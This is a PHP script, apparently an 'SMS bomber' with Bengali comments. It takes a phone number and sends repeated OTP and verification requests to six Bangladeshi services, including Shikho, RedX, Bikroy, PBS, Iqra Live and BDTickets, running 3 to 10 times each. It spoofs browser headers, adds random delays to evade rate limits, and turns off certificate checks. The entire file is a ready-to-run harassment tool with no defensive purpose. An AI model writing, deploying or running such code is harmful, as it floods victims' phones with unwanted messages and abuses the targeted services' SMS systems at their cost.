<?php
header('Content-Type: application/json');
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    die(json_encode(["status" => "error", "message" => "Phone number missing"]));
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

// কমন ফাংশন (BDTickets ছাড়া বাকিগুলোর জন্য)
function execute_request($url, $method = 'POST', $data = [], $headers = []) {
    sleep(rand(4, 6));
    $ch = curl_init();
    $default_headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9',
        'Connection: keep-alive'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => $data ? json_encode($data) : null,
        CURLOPT_HTTPHEADER => array_merge($default_headers, $headers),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    
    $res = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    return ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
}

$results = [];

// 1. Shikho (3 বার)
for($i=1; $i<=3; $i++){
    $results["shikho_$i"] = execute_request('https://api.shikho.com/auth/v2/send/sms', 'POST', 
        ["phone" => "88".$phone_11, "type" => "student", "auth_type" => "signup"], 
        ['Content-Type: application/json', 'Referer: https://shikho.com/', 'Origin: https://shikho.com']);
}

// 2. RedX (10 বার)
for($i=1; $i<=10; $i++){
    $results["redx_$i"] = execute_request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', 
        ["phoneNumber" => $phone_11], ['Content-Type: application/json']);
}

// 3. Bikroy (10 বার)
for($i=1; $i<=10; $i++){
    $results["bikroy_$i"] = execute_request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET');
}

// 4. PBS (5 বার)
for($i=1; $i<=5; $i++){
    $results["pbs_$i"] = execute_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
        ["userPhone" => $phone_11], ['Content-Type: application/json', 'Origin: https://pbs.com.bd']);
}

// 5. Iqra Live (3 বার)
for($i=1; $i<=3; $i++){
    $results["iqra_$i"] = execute_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
}

// 6. BDTickets (10 বার) - অরিজিনাল ডাইরেক্ট cURL মেথড
for($i=1; $i<=10; $i++){
    sleep(rand(6, 9)); // BDTickets-এর জন্য স্পেশাল ডিলে
    $curl = curl_init();
    curl_setopt_array($curl, [
      CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{"createUserCheck":true,"phoneNumber":"'.$phone_plus88.'","applicationChannel":"WEB_APP"}',
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_HTTPHEADER => [
        'Host: api.bdtickets.com:20100',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json',
        'origin: https://bdtickets.com',
        'referer: https://bdtickets.com/',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty'
      ],
    ]);
    $res = curl_exec($curl);
    $info = curl_getinfo($curl);
    curl_close($curl);
    
    $results["bdtickets_$i"] = ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
}

echo json_encode($results, JSON_PRETTY_PRINT);
?>
